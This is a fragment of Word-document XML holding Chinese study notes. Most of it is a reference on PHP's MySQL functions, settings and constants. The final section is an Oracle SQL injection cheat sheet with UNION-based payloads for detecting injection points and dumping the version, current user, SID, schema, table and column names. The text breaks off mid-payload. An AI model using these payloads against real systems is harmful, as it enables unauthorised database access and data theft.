        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> php.ini </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>中设置的影响。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043223F" w:rsidRDefault="0043223F" w:rsidP="0043223F">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="18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MySQL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>配置选项：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9"/>
        <w:gridCol w:w="782"/>
        <w:gridCol w:w="3083"/>
        <w:gridCol w:w="1916"/>
      </w:tblGrid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lastRenderedPageBreak/>
              <w:t>名称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默认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可更改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mysql.allow_persistent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"1"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是否允许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的持久连接。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PHP_INI_SYSTEM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mysql.max_persistent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"-1"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每个进程中最大的持久连接数目。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PHP_INI_SYSTEM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mysql.max_links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"-1"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每个进程中最大的连接数，包括持久连接。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PHP_INI_SYSTEM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mysql.trace_mode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"0"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跟踪模式。从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PHP 4.3.0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起可用。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mysql.default_port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指定默认连接数据库的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TCP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端口号。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mysql.default_socket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socket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名称。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PHP 4.0.1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起可用。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mysql.default_host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默认的服务器地址。不适用于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SQL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安全模式。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mysql.default_user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默认使用的用户名。不适用于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SQL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安全模式。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mysql.default_password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NULL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默认使用的密码。不适用于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SQL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安全模式。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mysql.connect_timeout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"60"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连接超时秒数。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PHP_INI_ALL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="0043223F" w:rsidRDefault="0043223F" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>相关常用</w:t>
      </w:r>
      <w:r>
        <w:t>函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0043223F" w:rsidRDefault="0043223F" w:rsidP="0043223F">
      <w:pPr>
        <w:pStyle w:val="note"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="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 w:rsidRPr="00162816">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>PHP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>指示支持该函数的最早的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>版本。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8"/>
        <w:gridCol w:w="4722"/>
        <w:gridCol w:w="730"/>
      </w:tblGrid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函数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43223F" w:rsidRDefault="0043223F">
            <w:pP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PHP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mysql_affected_rows()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取得前一次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操作所影响的记录行数。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mysql_change_user()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不赞成。改变活动连接中登录的用户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mysql_client_encoding()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返回当前连接的字符集的名称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mysql_close()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关闭非持久的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2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mysql_connect()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打开非持久的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mysql_create_db()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不赞成。新建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数据库。使用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3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mysql_data_seek()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移动记录指针。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4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mysql_db_name()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从对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mysql_list_dbs()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的调用返回数据库名称。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mysql_db_query()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不赞成。发送一条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查询。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lastRenderedPageBreak/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mysql_select_db()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和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lastRenderedPageBreak/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mysql_drop_db()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不赞成。丢弃（删除）一个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mysql_errno()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返回上一个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操作中的错误信息的数字编码。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mysql_error()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返回上一个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操作产生的文本错误信息。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mysql_escape_string()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不赞成。转义一个字符串用于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mysql_real_escape_string()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C75434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hyperlink r:id="rId17" w:history="1">
              <w:r w:rsidR="0043223F" w:rsidRPr="00202978">
                <w:rPr>
                  <w:rStyle w:val="a4"/>
                  <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                  <w:color w:val="FF0000"/>
                  <w:sz w:val="18"/>
                  <w:szCs w:val="18"/>
                  <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                </w:rPr>
                <w:t>mysql_fetch_array()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030CD4" w:rsidRPr="00030CD4" w:rsidRDefault="0043223F" w:rsidP="00030CD4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从结果集中取得一行作为关联数组，或数字数组，或二者兼有。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mysql_fetch_row() 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从结果集中取得一行数据并作为数组返回。每个结果的列储存在一个数组的单元中，偏移量从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0 </w:t>
            </w:r>
            <w:r w:rsidR="00030CD4"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开始。</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0043223F" w:rsidRPr="00202978" w:rsidRDefault="00030CD4" w:rsidP="00030CD4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依次调用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mysql_fetch_row() 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将返回结果集中的下一行，如果没有更多行则返回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FALSE</w:t>
            </w:r>
            <w:r w:rsidRPr="00030CD4">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
                <w:color w:val="FF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mysql_fetch_assoc()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从结果集中取得一行作为关联数组。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1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mysql_fetch_field()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从结果集中取得列信息并作为对象返回。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mysql_fetch_lengths()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取得结果集中每个字段的内容的长度。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mysql_fetch_object()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从结果集中取得一行作为对象。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2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mysql_fetch_row()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从结果集中取得一行作为数字数组。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3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mysql_field_flags()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从结果中取得和指定字段关联的标志。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4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mysql_field_len()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返回指定字段的长度。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mysql_field_name()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取得结果中指定字段的字段名。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mysql_field_seek()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将结果集中的指针设定为指定的字段偏移量。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7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mysql_field_table()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取得指定字段所在的表名。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mysql_field_type()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取得结果集中指定字段的类型。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2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mysql_free_result()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释放结果内存。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mysql_get_client_info()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客户端信息。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mysql_get_host_info()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主机信息。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2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mysql_get_proto_info()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协议信息。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3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mysql_get_server_info()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服务器信息。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4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mysql_info()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取得最近一条查询的信息。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mysql_insert_id()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取得上一步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INSERT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操作产生的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ID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mysql_list_dbs()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服务器中所有的数据库。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mysql_list_fields()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结果中的字段。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7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mysql_list_processes()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进程。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mysql_list_tables()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pStyle w:val="a8"/>
              <w:spacing w:before="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不赞成。列出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数据库中的表。</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0043223F" w:rsidRDefault="0043223F">
            <w:pPr>
              <w:pStyle w:val="a8"/>
              <w:spacing w:before="180" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeas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Use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mysql_num_fields()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取得结果集中字段的数目。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39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mysql_num_rows()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取得结果集中行的数目。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0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mysql_pconnect()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打开一个到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服务器的持久连接。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1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mysql_ping()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Ping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一个服务器连接，如果没有连接则重新连接。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C75434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hyperlink r:id="rId42" w:history="1">
              <w:r w:rsidR="0043223F" w:rsidRPr="00202978">
                <w:rPr>
                  <w:rStyle w:val="a4"/>
                  <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                  <w:color w:val="FF0000"/>
                  <w:sz w:val="18"/>
                  <w:szCs w:val="18"/>
                  <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                </w:rPr>
                <w:t>mysql_query()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D0368B" w:rsidRPr="00D0368B" w:rsidRDefault="0043223F" w:rsidP="00D0368B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发送一条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 xml:space="preserve"> MySQL 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语句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。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可以</w:t>
            </w:r>
            <w:r w:rsidR="00B253B8">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="FF0000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>是任意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MySQL</w:t>
            </w:r>
            <w:r w:rsidR="00B253B8">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
                <w:color w:val="FF0000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>语句</w:t>
            </w:r>
            <w:r w:rsidR="00B253B8">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="FF0000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>，不仅仅是查询语句。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仅对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SELECT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，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SHOW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，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EXPLAIN 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或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DESCRIBE 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语句返回一个资源标识符，如果查询执行不正确则返回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FALSE</w:t>
            </w:r>
            <w:r w:rsidR="00D0368B"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。</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0043223F" w:rsidRPr="00202978" w:rsidRDefault="00D0368B" w:rsidP="00D0368B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对于其它类型的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SQL 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语句，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mysql_query() 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在执行成功时返回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TRUE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，出错时返回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 xml:space="preserve"> FALSE</w:t>
            </w:r>
            <w:r w:rsidRPr="00D0368B">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
                <w:color w:val="FF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C75434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hyperlink r:id="rId43" w:history="1">
              <w:r w:rsidR="0043223F" w:rsidRPr="00202978">
                <w:rPr>
                  <w:rStyle w:val="a4"/>
                  <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                  <w:color w:val="FF0000"/>
                  <w:sz w:val="18"/>
                  <w:szCs w:val="18"/>
                  <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                </w:rPr>
                <w:t>mysql_real_escape_string()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202978" w:rsidRDefault="0043223F">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="FF0000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pP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转义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 xml:space="preserve"> SQL </w:t>
            </w:r>
            <w:r w:rsidRPr="00202978">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="FF0000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>语句中使用的字符串中的特殊字符。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4A6634" w:rsidRDefault="00C75434">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId44" w:history="1">
              <w:r w:rsidR="0043223F" w:rsidRPr="004A6634">
                <w:rPr>
                  <w:rStyle w:val="a4"/>
                  <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                  <w:color w:val="auto"/>
                  <w:sz w:val="18"/>
                  <w:szCs w:val="18"/>
                  <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                </w:rPr>
                <w:t>mysql_result()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Pr="004A6634" w:rsidRDefault="00094ECB" w:rsidP="004A6634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取得</w:t>
            </w:r>
            <w:r w:rsidR="004A6634">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
              </w:rPr>
              <w:t>结果集中一个字段的值。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5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mysql_select_db()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选择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数据库。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6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mysql_stat()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取得当前系统状态。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mysql_tablename()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不赞成。取得表名。使用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mysql_query()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代替。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7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mysql_thread_id()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返回当前线程的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ID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  <w:tr w:rsidR="0043223F" w:rsidTr="0043223F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C75434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hyperlink r:id="rId48" w:history="1">
              <w:r w:rsidR="0043223F">
                <w:rPr>
                  <w:rStyle w:val="a4"/>
                  <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                  <w:color w:val="900B09"/>
                  <w:sz w:val="18"/>
                  <w:szCs w:val="18"/>
                  <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                </w:rPr>
                <w:t>mysql_unbuffered_query()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向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MySQL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发送一条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SQL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查询（不获取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/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缓存结果）。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43223F" w:rsidRDefault="0043223F">
            <w:pPr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</w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="0043223F" w:rsidRDefault="00202978" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">PHP </w:t>
      </w:r>
      <w:r>
        <w:t>Mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>常量</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00202978" w:rsidRPr="00202978" w:rsidRDefault="00202978" w:rsidP="00202978">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="180" w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="840"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在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PHP 4.3.0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以后的版本中，允许在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mysql_connect()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函数和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mysql_pconnect()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函数中指定更多的客户端标记：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00202978" w:rsidRPr="00202978" w:rsidRDefault="00202978" w:rsidP="00202978">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="840" w:firstLine="4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02978">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>PHP</w:t>
      </w:r>
      <w:r w:rsidRPr="00202978">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>：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指示支持该常量的最早的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PHP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版本。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72"/>
        <w:gridCol w:w="4288"/>
        <w:gridCol w:w="730"/>
      </w:tblGrid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常量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PHP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MYSQL_CLIENT_COMPRESS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使用压缩的通讯协议。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MYSQL_CLIENT_IGNORE_SPACE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允许在函数名后留空格位。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MYSQL_CLIENT_INTERACTIVE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在关闭连接前所允许的交互超时非活动时间。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MYSQL_CLIENT_SSL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使用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SSL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加密（仅在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MySQL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客户端库版本为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4+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时可用）。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4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00202978" w:rsidRPr="00202978" w:rsidRDefault="00202978" w:rsidP="00202978">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="180" w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="12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mysql_fetch_array() </w:t>
      </w:r>
      <w:r w:rsidRPr="00202978">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>函数使用一个常量来表示所返回数组的类型：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4"/>
        <w:gridCol w:w="4815"/>
        <w:gridCol w:w="730"/>
      </w:tblGrid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b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:kern w:val="0"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>PHP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MYSQL_ASSOC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返回的数据列使用字段名作为数组的索引名。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MYSQL_BOTH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返回的数据列使用字段名及数字索引作为数组的索引名。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  <w:tr w:rsidR="00202978" w:rsidRPr="00202978" w:rsidTr="00202978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MYSQL_NUM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spacing w:line="270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返回的数据列使用数字索引作为数组的索引名。</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00202978" w:rsidRPr="00202978" w:rsidRDefault="00202978" w:rsidP="00202978">
            <w:pPr>
              <w:widowControl/>
              <w:spacing w:before="180" w:line="270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索引从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 xml:space="preserve"> 0 </w:t>
            </w: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开始，表示返回结果的第一个字段。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hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00202978" w:rsidRPr="00202978" w:rsidRDefault="00202978" w:rsidP="00202978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202978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</w:tbl>
    <w:p w:rsidR="000303C4" w:rsidRDefault="000303C4" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>PHP M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ysqli</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000303C4" w:rsidRDefault="000303C4" w:rsidP="000303C4">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="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Style w:val="a9"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>PHP MySQLi = PHP MySQL Improved!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000303C4" w:rsidRDefault="000303C4" w:rsidP="000303C4">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="180" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:ind w:left="840" w:firstLine="42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MySQLi </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>函数允许您访问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> MySQL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>数据库服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000303C4" w:rsidRPr="000303C4" w:rsidRDefault="000303C4" w:rsidP="000303C4">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB46BA" w:rsidRPr="00EB46BA" w:rsidRDefault="00EB46BA" w:rsidP="00EB46BA">
      <w:r>
        <w:tab/>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>只能</w:t>
      </w:r>
      <w:r>
        <w:t>访问一个数据库，不能跨数据库访问其他表。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C2440" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入点判断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>and 1=1 and 1=2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>返回不同表明有注入点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 xml:space="preserve">/* </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>支持的注释符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 xml:space="preserve">-- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MsSQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>支持的注释符</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C2440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>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>不支持多行查询</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="005C2440" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>内置系统表：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and exists(select * from dual)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and (select count(*) from user_tables)&gt;0—</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="005C2440" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入点信息判断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获取数据库版本信息</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select null,null,(select banner from sys.v_$version where rownum=1) from dual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获取当前数据库连接用户名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select null,null,(select SYS_CONTEXT ('USERENV','CURRENT_USER') from dual) from dual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获取系统平台</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select null,null,(select member from v$logfile where rownum=1) from dual</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3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获取服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SID</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>and 1=2 union select null,null,(select instance_name from v$instance) from dual</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="005C2440" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>oracle</w:t>
      </w:r>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>系统表爆数据内容</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AF7813" w:rsidRDefault="00AF7813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爆当前</w:t>
      </w:r>
      <w:r>
        <w:t>用户名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AF7813" w:rsidRDefault="00AF7813" w:rsidP="00AF7813">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="1260" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00AF7813">
        <w:t>select table_name from user_tables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爆库名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select null,null,(select owner from all_tables where rownum=1)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爆出第一个库名后可以使用如下语句，继续爆其他库名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owner from all_table where rownum=1 and owner&lt;&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>第一个库名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>') from dual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获取表名</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>and 1=2 union select null,null,(select table_name from user_tables where rownum=1)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爆其他表名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table_name from user_tables where rownum=1 and table_name&lt;&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>第一个表名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>')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表名要用大写或大写的十六进制代码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获取字段名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column_name from user_tab_columns where table_name='</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
